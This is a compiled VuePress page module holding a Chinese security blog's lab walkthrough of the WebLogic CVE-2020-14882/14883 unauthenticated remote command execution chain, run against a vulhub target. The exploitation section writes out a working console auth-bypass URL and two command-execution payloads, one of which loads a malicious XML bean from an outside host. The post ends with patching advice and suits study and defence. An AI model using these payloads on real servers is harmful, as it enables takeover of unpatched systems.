import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,a,b as o,d as p,e as c,r as l,o as i}from"./app-ClR9AqGF.js";const r="/DailyNotes/assets/01-BcOlml6F.png",u="/DailyNotes/assets/02-Bf56Qz_n.png",g="/DailyNotes/assets/04-QdVQXJne.png",d="/DailyNotes/assets/03-Dux0wSH0.png",h="/DailyNotes/assets/06-BqgLWTfZ.png",k={},m={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"};function b(f,n){const t=l("ExternalLinkIcon");return i(),s("div",null,[n[1]||(n[1]=a("h1",{id:"漏洞名称-weblogic-管理控制台未授权远程命令执行漏洞",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞名称-weblogic-管理控制台未授权远程命令执行漏洞"},[a("span",null,"漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞")])],-1)),n[2]||(n[2]=a("h2",{id:"漏洞介绍",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞介绍"},[a("span",null,"漏洞介绍")])],-1)),a("blockquote",null,[a("p",null,[a("a",m,[n[0]||(n[0]=p("国家信息安全漏洞库 (cnnvd.org.cn)",-1)),c(t)])])]),n[3]||(n[3]=o(`<p>Weblogic 是 Oracle 公司推出的 J2EE 应用服务器，Oracle WebLogic Server 多版本的 Oracle Fusion Middleware 存在安全漏洞，该漏洞使未经身份验证的攻击者可以通过 HTTP 访问网络，从而破坏 Oracle WebLogic Server。在 2020 年 10 月的更新中，Oracle 官方修复了两个长亭科技安全研究员@voidfyoo 提交的安全漏洞，分别是 CVE-2020-14882 和 CVE-2020-14883。</p><p>CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个 GET 请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。</p><p>参考链接：</p><ul><li>https://www.oracle.com/security-alerts/cpuoct2020traditional.html</li><li>https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf</li></ul><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h3><p>远程代码执行漏洞 （CVE-2020-14882）POC 已被公开，未经身份验证的远程攻击者可通过构造特殊的 HTTP GET 请求，结合 CVE-2020-14883 漏洞进行利用，利用此漏洞可在未经身份验证的情况下直接接管 WebLogic Server Console ，并执行任意代码，利用门槛低，危害巨大。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围"><span>影响范围</span></a></h3><ul><li>weblogic 10.3.6.0.0</li><li>weblogic 12.1.3.0.0</li><li>weblogic 12.2.1.3.0</li><li>weblogic 12.2.1.4.0</li><li>weblogic 14.1.1.0.0</li></ul><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用"><span>漏洞利用</span></a></h2><hr><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境"><span>靶机环境</span></a></h3><p>vulhub/weblogic/CVE-2020-14882</p><hr><h3 id="利用方法-1" tabindex="-1"><a class="header-anchor" href="#利用方法-1"><span>利用方法 1</span></a></h3><p><strong>探测确认</strong></p><p>使用 weblogicScanner(https://github.com/0xn0ne/weblogicScanner)探测是否存在该漏洞</p><pre><code>python3 ws.py -v CVE-2020-14882 -t 192.168.1.189:7001
</code></pre><figure><img src="`+r+`" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><p>首先测试权限绕过漏洞（CVE-2020-14882），访问以下 URL，即可未授权访问到管理后台页面：</p><pre><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal
</code></pre><figure><img src="`+u+`" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>成功登录到后台页面。</p><p>虽然利用漏洞 CVE-2020-14882 成功登录到后台页面，但当前用户是低权限用户，并不能执行命令。此时需要用到第二个漏洞 CVE-2020-14883。这个漏洞的利用方式有两种，一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>。</p><p>直接访问如下 URL，即可利用 com.tangosol.coherence.mvel2.sh.ShellSession 执行命令：</p><pre><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/success1&#39;);&quot;)
</code></pre><figure><img src="`+g+`" alt="04" tabindex="0" loading="lazy"><figcaption>04</figcaption></figure><p>页面显示 404，回到服务器端执行如下命令登录到容器里面</p><pre><code>docker exec -i -t 容器id /bin/bash
</code></pre><figure><img src="`+d+`" alt="03" tabindex="0" loading="lazy"><figcaption>03</figcaption></figure><p>可以看到 success1 成功创建，命令执行成功。</p><p>这个利用方法只能在 Weblogic 12.2.1 以上版本利用，因为 10.3.6 并不存在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类。</p><h3 id="利用方法-2" tabindex="-1"><a class="header-anchor" href="#利用方法-2"><span>利用方法 2</span></a></h3><p><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>是一种更为通杀的方法，最早在 CVE-2019-2725 被提出，对于所有 Weblogic 版本均有效。</p><p>首先，我们需要构造一个 XML 文件，并将其保存在 Weblogic 可以访问到的服务器上，如<code>http://example.com/rce.xml</code>：</p><pre><code class="language-xml"><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.springframework.org/schema/beans<span class="token punctuation">&quot;</span></span>
   <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">&quot;</span></span>
   <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>pb<span class="token punctuation">&quot;</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>java.lang.ProcessBuilder<span class="token punctuation">&quot;</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>start<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span><span class="token cdata">&lt;![CDATA[touch /tmp/success2]]&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span>
</code></pre><p>然后通过如下 URL，即可让 Weblogic 加载这个 XML，并执行其中的命令：</p><pre><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://10.82.234.169:8000/rce.xml&quot;)
</code></pre><figure><img src="`+h+'" alt="06" tabindex="0" loading="lazy"><figcaption>06</figcaption></figure><p>这个利用方法也有自己的缺点，就是需要 Weblogic 的服务器能够访问到恶意 XML。</p><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议"><span>威胁防护建议</span></a></h2><ol><li>Oracle 官方最新漏洞修复补丁；</li><li>临时关闭后台/console/console.portal 的对外访问</li></ol>',45))])}const v=e(k,[["render",b]]),x=JSON.parse('{"path":"/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2020-14882.html","title":"漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞","lang":"zh-CN","frontmatter":{"category":"网络安全","tag":"漏洞分析","description":"漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) Weblogic 是 Oracle 公司推出的 J2EE 应用服务器，Oracle WebLogic Server 多版本的 Oracle Fusion Middleware 存在安全漏洞，该漏洞使未经身份验证的攻击者可以通过 HT...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2020-14882.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞"}],["meta",{"property":"og:description","content":"漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) Weblogic 是 Oracle 公司推出的 J2EE 应用服务器，Oracle WebLogic Server 多版本的 Oracle Fusion Middleware 存在安全漏洞，该漏洞使未经身份验证的攻击者可以通过 HT..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-04T09:27:16.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"漏洞分析"}],["meta",{"property":"article:modified_time","content":"2025-06-04T09:27:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-06-04T09:27:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"漏洞介绍","slug":"漏洞介绍","link":"#漏洞介绍","children":[{"level":3,"title":"漏洞危害","slug":"漏洞危害","link":"#漏洞危害","children":[]},{"level":3,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]}]},{"level":2,"title":"漏洞利用","slug":"漏洞利用","link":"#漏洞利用","children":[{"level":3,"title":"靶机环境","slug":"靶机环境","link":"#靶机环境","children":[]},{"level":3,"title":"利用方法 1","slug":"利用方法-1","link":"#利用方法-1","children":[]},{"level":3,"title":"利用方法 2","slug":"利用方法-2","link":"#利用方法-2","children":[]}]},{"level":2,"title":"威胁防护建议","slug":"威胁防护建议","link":"#威胁防护建议","children":[]}],"git":{"createdTime":1731665131000,"updatedTime":1749029236000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":3}]},"readingTime":{"minutes":2.93,"words":880},"filePathRelative":"CyberSecurity/RedTeam/2-WebVulnerability/Weblogic/weblogic_CVE-2020-14882.md","localizedDate":"2024年11月15日","excerpt":"\\n","autoDesc":true}');export{v as comp,x as data};
